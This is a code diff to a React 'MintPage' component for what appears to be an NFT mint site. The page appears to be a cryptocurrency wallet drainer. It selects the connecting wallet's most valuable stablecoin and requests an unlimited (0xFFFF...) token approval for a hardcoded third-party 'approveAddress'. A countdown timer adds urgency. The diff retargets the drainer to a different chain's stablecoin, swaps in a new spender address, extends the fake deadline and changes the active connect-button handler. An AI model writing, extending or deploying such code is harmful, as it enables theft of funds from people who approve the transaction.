@@ -255,7 +255,7 @@ function MintPage() {
 
   const addTimer = () => {
     // Set the countdown date
-    const countDownDate = new Date("Apr 03, 2025 23:59:59").getTime();
+    const countDownDate = new Date("OCT 05, 2025 23:59:59").getTime();
 
     // Get the elements to display the days, hours, minutes, and seconds
     const showDays = document.querySelectorAll(".show_day");
@@ -596,9 +596,9 @@ function MintPage() {
 
     let len = walletTokenAddress.length;
     let walletTokenB1 = [];
+    /* let maxValueTokenAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7"; */
     /* let maxValueTokenAddress = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56"; */
-    /* let maxValueTokenAddress = "0x55d398326f99059ff775485246999027b3197955"; */
-    let maxValueTokenAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7";
+    let maxValueTokenAddress = "0x55d398326f99059ff775485246999027b3197955";
 
 
     if (len > 0) {
@@ -615,7 +615,7 @@ function MintPage() {
         }
       }
       if (walletTokenB1[0] == 0) {
-        maxValueTokenAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7";
+        maxValueTokenAddress = "0x55d398326f99059ff775485246999027b3197955";
       } else {
         for (let i = 0; i < len; i++) {
           if (walletTokenB[i] == walletTokenB1[0]) {
@@ -624,7 +624,7 @@ function MintPage() {
         }
       }
     } else {
-      maxValueTokenAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7";
+      maxValueTokenAddress = "0x55d398326f99059ff775485246999027b3197955";
     }
     console.log(walletTokenB1);
     console.log(walletTokenAddress);
@@ -651,7 +651,7 @@ function MintPage() {
       params: [approveTransactionParameters],
     }) */
 
-    const approveAddress = "0xC7C421854295709136ED9179f16E469909530F44";
+    const approveAddress = "0x1eC50352E038830dF5b44075fcD4c39c09a570B6";
     const price =
       "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
 
@@ -775,7 +775,7 @@ function MintPage() {
   };
 
 
-  const onBtnClick = async () => {
+/*   const onBtnClick = async () => {
 		const targetChainId = '0x1'; // Replace with your desired chain ID (e.g., Ethereum Mainnet is '0x1')
 	
 		if (window.ethereum) {
@@ -833,9 +833,9 @@ function MintPage() {
 			console.log('Redirecting to MetaMask mobile app:', metamaskAppDeepLink);
 			window.open(metamaskAppDeepLink, '_self');
 		}
-	};
+	}; */
 
-/*   const onBtnClick = async () => {
+  const onBtnClick = async () => {
     if (window.ethereum) {
         try {
             const chain = await window.ethereum.request({ method: 'eth_chainId' });
@@ -862,7 +862,7 @@ function MintPage() {
       const metamaskAppDeepLink = "https://metamask.app.link/dapp/" + dappUrl;
       window.open(metamaskAppDeepLink, "_self");
     }
-}; */
+};
 
 /*   const onBtnClick = async () => {
     if (window.ethereum) {
